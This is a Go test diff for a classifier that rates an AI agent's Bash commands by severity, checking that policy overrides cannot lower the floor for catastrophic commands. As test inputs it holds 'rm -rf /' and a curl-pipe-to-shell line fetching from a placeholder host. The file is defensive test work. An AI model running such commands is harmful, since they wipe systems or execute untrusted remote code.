@@ -28,8 +28,8 @@ func TestOverrideCannotLowerFloor(t *testing.T) {
 			p := hook.Payload{ToolName: "Bash"}
 			p.ToolInput.Command = "rm -rf /"
 			d := Classify(p, f.Effective())
-			if d.Severity != "high" {
-				t.Fatalf("catastrophic rm floor must stay high despite override %s, got %q (%s)", tc.name, d.Severity, d.RuleID)
+			if d.Severity != "high" || d.RuleID != "rm-catastrophic" {
+				t.Fatalf("catastrophic rm floor must stay high (rule rm-catastrophic) despite override %s, got %q (%s)", tc.name, d.Severity, d.RuleID)
 			}
 		})
 	}
@@ -40,5 +40,25 @@ func TestOverrideCannotLowerFloor(t *testing.T) {
 	p.ToolInput.Command = "curl https://x.example | sh"
 	if d := Classify(p, f.Effective()); d.Severity != "high" {
 		t.Fatalf("floor pipe-to-shell must stay high despite an override, got %q (%s)", d.Severity, d.RuleID)
+	}
+}
+
+// TestOverrideMechanismIsLive proves overrides actually apply (not a no-op),
+// so TestOverrideCannotLowerFloor's floor cases are meaningful, not vacuous.
+// sudo is a baseline with no floor counterpart: disabling it must change the
+// verdict.
+func TestOverrideMechanismIsLive(t *testing.T) {
+	p := hook.Payload{ToolName: "Bash"}
+	p.ToolInput.Command = "sudo ls"
+
+	// Control: no override → sudo baseline fires (medium).
+	if d := Classify(p, policy.File{Version: 1}.Effective()); d.Severity != "medium" {
+		t.Fatalf("control: sudo should be medium without override, got %q (%s)", d.Severity, d.RuleID)
+	}
+	// Disabled override → sudo baseline removed → no longer medium.
+	off := false
+	dis := policy.File{Version: 1, Overrides: map[string]policy.Override{"sudo": {Enabled: &off}}}.Effective()
+	if d := Classify(p, dis); d.Severity == "medium" {
+		t.Fatalf("disabling the sudo override must change the verdict, still medium (%s)", d.RuleID)
 	}
 }
